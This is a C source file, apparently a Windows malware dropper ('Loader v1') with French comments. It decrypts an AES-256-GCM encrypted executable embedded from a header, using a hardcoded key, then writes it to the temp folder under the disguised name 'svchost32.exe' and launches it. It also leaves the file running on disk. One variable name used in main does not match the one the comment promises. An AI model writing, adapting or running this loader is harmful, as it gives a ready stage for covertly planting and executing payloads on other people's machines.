#include <windows.h>
#include <bcrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#pragma comment(lib, "bcrypt.lib")

/* ============================================================
 * Payload chiffré — généré par xxd -i payload.enc
 * (voir loader/payload/payload.h, à inclure ici)
 * ============================================================ */

#include "payload.h"   /* définit : unsigned char payload_enc[]; unsigned int payload_enc_len; */

/* Clé AES-256 (32 octets). DOIT correspondre à la clé utilisée
 * pour chiffrer le payload avec tools/encrypt_payload. */
static const uint8_t AES_KEY[32] = {
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
    0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff,
    0x00, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77,
    0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff
};

#define IV_SIZE   12
#define TAG_SIZE  16

/* ============================================================
 * Déchiffrement AES-256-GCM via BCrypt (CNG Windows)
 * ============================================================ */

static int aes_gcm_decrypt(const uint8_t *key,
                           const uint8_t *in, size_t in_len,
                           uint8_t *out, size_t *out_len)
{
    if (in_len < IV_SIZE + TAG_SIZE) return -1;

    const uint8_t *iv  = in;
    const uint8_t *ct  = in + IV_SIZE;
    size_t         ct_len = in_len - IV_SIZE - TAG_SIZE;
    const uint8_t *tag = in + IV_SIZE + ct_len;

    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    int ret = -1;

    /* Ouvrir l'algo AES. */
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "[-] BCryptOpenAlgorithmProvider: 0x%lx\n", status);
        return -1;
    }

    /* Mode GCM. */
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE,
                               (PUCHAR)BCRYPT_CHAIN_MODE_GCM,
                               sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "[-] BCryptSetProperty: 0x%lx\n", status);
        goto cleanup;
    }

    /* Générer la clé symétrique. */
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0,
                                         (PUCHAR)key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "[-] BCryptGenerateSymmetricKey: 0x%lx\n", status);
        goto cleanup;
    }

    /* Info GCM. */
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
    BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
    authInfo.pbNonce = (PUCHAR)iv;
    authInfo.cbNonce = IV_SIZE;
    authInfo.pbTag   = (PUCHAR)tag;
    authInfo.cbTag   = TAG_SIZE;

    /* Déchiffrer. */
    ULONG out_done = 0;
    status = BCryptDecrypt(hKey,
                           (PUCHAR)ct, (ULONG)ct_len,
                           &authInfo,
                           NULL, 0,
                           out, (ULONG)ct_len,
                           &out_done, 0);

    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "[-] BCryptDecrypt: 0x%lx (mauvaise clé ou tag corrompu ?)\n", status);
        goto cleanup;
    }

    *out_len = out_done;
    ret = 0;

cleanup:
    if (hKey) BCryptDestroyKey(hKey);
    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
    return ret;
}

/* ============================================================
 * Écriture du payload sur disque + exécution
 * ============================================================ */

static int write_and_execute(const uint8_t *data, size_t len)
{
    /* Chemin : %TEMP%\svchost32.exe */
    char temp_path[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, temp_path)) {
        fprintf(stderr, "[-] GetTempPathA échoué: %lu\n", GetLastError());
        return -1;
    }

    char exe_path[MAX_PATH];
    snprintf(exe_path, MAX_PATH, "%ssvchost32.exe", temp_path);

    printf("[*] Écriture dans : %s\n", exe_path);

    /* Écrire le fichier. */
    HANDLE hFile = CreateFileA(exe_path, GENERIC_WRITE, 0, NULL,
                               CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        fprintf(stderr, "[-] CreateFileA échoué: %lu\n", GetLastError());
        return -1;
    }

    DWORD written = 0;
    if (!WriteFile(hFile, data, (DWORD)len, &written, NULL) || written != len) {
        fprintf(stderr, "[-] WriteFile échoué: %lu\n", GetLastError());
        CloseHandle(hFile);
        return -1;
    }
    CloseHandle(hFile);

    /* Exécuter. */
    STARTUPINFOA si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };

    printf("[*] Lancement du payload...\n");
    if (!CreateProcessA(exe_path, NULL, NULL, NULL, FALSE,
                        0, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[-] CreateProcessA échoué: %lu\n", GetLastError());
        return -1;
    }

    printf("[+] Payload lancé (PID %lu)\n", pi.dwProcessId);

    /* Nettoyage des handles — on ne fait PAS WaitForSingleObject
     * sinon le loader reste en vie trop longtemps. */
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    /* On laisse le fichier sur disque pour que le payload tourne.
     * (Sera supprimé au prochain reboot ou par le payload lui-même.) */
    printf("[*] Loader terminé.\n");
    return 0;
}

/* ============================================================
 * main
 * ============================================================ */

int main(void)
{
    printf("========================================\n");
    printf("  Loader v1 — Embedded\n");
    printf("========================================\n\n");

    printf("[*] Payload chiffré : %u octets\n", fsociety_payload_enc_len);

    /* Buffer pour le payload déchiffré. */
    uint8_t *plain = malloc(fsociety_payload_enc_len);
    if (!plain) {
        fprintf(stderr, "[-] malloc échoué\n");
        return 1;
    }

    size_t plain_len = 0;
    if (aes_gcm_decrypt(AES_KEY, fsociety_payload_enc, fsociety_payload_enc_len,
                        plain, &plain_len) != 0) {
        fprintf(stderr, "[-] Déchiffrement échoué\n");
        free(plain);
        return 1;
    }

    printf("[+] Payload déchiffré : %zu octets\n", plain_len);

    /* Vérification : le payload doit commencer par "MZ" (PE header). */
    if (plain_len >= 2 && plain[0] == 'M' && plain[1] == 'Z') {
        printf("[+] Header PE détecté (MZ) — payload valide\n");
    } else {
        fprintf(stderr, "[-] Header PE manquant — mauvais déchiffrement ?\n");
        free(plain);
        return 1;
    }

    int ret = write_and_execute(plain, plain_len);
    free(plain);
    return ret == 0 ? 0 : 1;
}